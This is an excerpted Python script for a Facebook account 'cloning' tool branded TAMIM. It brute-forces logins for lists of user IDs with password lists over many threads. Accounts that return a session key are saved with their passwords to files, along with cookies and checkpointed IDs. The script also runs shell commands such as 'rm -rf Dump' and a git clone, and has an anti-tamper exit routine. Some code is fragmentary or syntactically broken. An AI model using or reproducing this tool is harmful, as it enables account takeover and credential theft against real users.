...
def clr():
    try:
        ...
        if 'Android' in data:
            print(' \033[1;32m[!] DONT TRY AGAIN ITS TAMIM ');exit()
        else:exit()
    except:exit()
####### MODULES KILLER #######
...
888    888 88888888 "Y8888P"  
                               \033[1;32mTAMIM\033[1;37m 
[+]====================================================
[+] OWNER      : Nasir Abas
[+] GITHUB     : TAYAB-KHAN
[+] STATUS     : FREE
[+] VERSION    : 0.1
[+] ENJOY ALL : LOVE ❤️YoU 🖇️All😏
====================================================""")
def linex():
	print(f'\033[1;37m====================================================')
def TAMIM():
		clear()
		print(f'\033[1;37m [1] File Cloning (\033[1;32m \033[1;37m )\n [2] Random Cloning [3] Gmail Cloning \n [0] Exit')
		linex()
		...
		if shm =='1':
			...
			clear()
			os.system('rm -rf Dump && git clone https://github.com/TAYAB-KHAN')
		elif shm =='5':
			os.system('git clone https://github.com/TAYAB-KHAN')
		elif shm =='6':
			os.system('xdg-open ')
			TAMIM()
		elif shm =='7':
...
def file_crack():
	...
	with tred(max_workers=30) as TAMIM:
		...
		print("\33[1;37m [+] Your Cp/Ok Id Save In TAMIM Folder")
		linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if methd =='1':
				TAMIM.submit(api1,ids,names,passlist)
			else:
				TAMIM.submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m[ TAMIM ]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m[TAMIM-OK] '+uid+' | '+pas)		                    
						#print(' \33[1;96m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'TAMIM_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'TAMIM_COOKIES.txt')
					...
					#	print(f'\r\r\33[1m\33[1;35m [TAMIM-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'TAMIM-CP.txt')
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[ TAMIM-M1 ]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					...
					print('\r\r\033[1;32m [TAMIM-OK] '+uid+' | '+pas)
					linex()
					file_path = os.path.join(folder_path, 'TAYABKHAN_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
					...
					uid = str(po['error']['error_data']['uid'])
			#		print(f'\r\r\33[1m\33[1;35m [TAMIM-CP] '+uid+' | '+pas+'\033[1;97m')
					file_path = os.path.join(folder_path,TAMIM '-OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					cps.append(uid)
					break
